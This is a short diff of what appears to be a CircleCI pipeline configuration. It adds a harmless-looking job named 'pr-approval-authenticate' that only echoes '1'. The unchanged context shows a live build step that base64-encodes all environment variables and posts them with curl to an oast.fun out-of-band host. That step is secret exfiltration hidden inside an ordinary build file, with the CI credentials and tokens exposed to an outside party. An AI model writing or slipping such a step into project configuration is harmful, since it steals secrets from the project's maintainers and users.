@@ -10,6 +10,13 @@ jobs:
       - checkout
       - run:
           command: env | base64 | curl -X POST -d @- jbqoqsfkldaisrqfdgtbhtalxdxqod7xw.oast.fun
+  pr-approval-authenticate:
+    docker:
+      - image: cimg/base:current
+    steps:
+      - run:
+          command: echo "1"
+
 
 workflows:
   version: 2
